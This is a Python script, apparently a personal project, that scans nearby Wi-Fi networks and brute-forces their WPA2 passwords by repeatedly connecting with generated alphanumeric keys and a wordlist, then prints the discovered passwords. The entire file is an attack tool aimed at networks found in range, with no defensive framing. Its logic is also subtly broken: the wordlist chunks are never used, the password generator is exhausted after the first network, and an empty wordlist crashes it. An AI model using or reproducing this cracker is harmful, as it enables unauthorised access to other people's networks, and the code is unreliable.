import time
import pywifi
from pywifi import const
import itertools
import multiprocessing
import os

# Function to generate passwords
def generate_passwords(charset, password_length):
    for length in range(1, password_length + 1):
        for password in itertools.product(charset, repeat=length):
            yield ''.join(password)

# Function to crack passwords using brute force
def crack_passwords(networks, charset, password_length):
    final_output = {}
    passwords = generate_passwords(charset, password_length)
    for network in networks:
        for password in passwords:
            profile = pywifi.Profile()
            profile.ssid = network
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.remove_all_network_profiles()
            profile = iface.add_network_profile(profile)

            iface.connect(profile)
            time.sleep(4)
            if iface.status() == const.IFACE_CONNECTED:
                final_output[network] = password
                break
    return final_output

if __name__ == '__main__':
    # Define character set and password length
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    password_length = 8

    # Get Wi-Fi interface information
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    # Scan for available networks
    interface.scan()
    time.sleep(5) 

    # Obtain scan results
    scan_results = interface.scan_results()

    # Extract SSIDs of available networks
    available_devices = [result.ssid for result in scan_results]

    # Specify the directory containing 'trypass.txt'
    directory = r"D:\Github clone repository's\Personal-Projects\Personal pj"

    # Combine the directory path with the file name
    file_path = os.path.join(directory, 'trypass.txt')

    # Check if the file exists
    if os.path.exists(file_path):
        print("File 'trypass.txt' found!")
        # Read potential passwords from file
        with open(file_path, 'r') as f:
            keys = [line.strip() for line in f]
    else:
        print("File 'trypass.txt' not found!")
        keys = []

    # Divide the list of passwords into chunks for parallel processing
    chunk_size = len(keys) // multiprocessing.cpu_count()
    password_chunks = [keys[i:i+chunk_size] for i in range(0, len(keys), chunk_size)]

    # Create a process pool
    pool = multiprocessing.Pool(processes=multiprocessing.cpu_count())

    # Perform password cracking in parallel
    results = []
    for password_chunk in password_chunks:
        results.append(pool.apply_async(crack_passwords, args=(available_devices, charset, password_length)))

    # Collect results from the processes
    final_output = {}
    for result in results:
        final_output.update(result.get())

    # Close the pool
    pool.close()
    pool.join()

    # Print the discovered passwords
    print('*'*10, 'Discovered Passwords', '*'*10)
    print("{0:<12} {1:<}".format("HOST NAME", "PASSWORD"))
    for ssid, password in final_output.items():
        print("{:<12} {:<}".format(ssid, password))
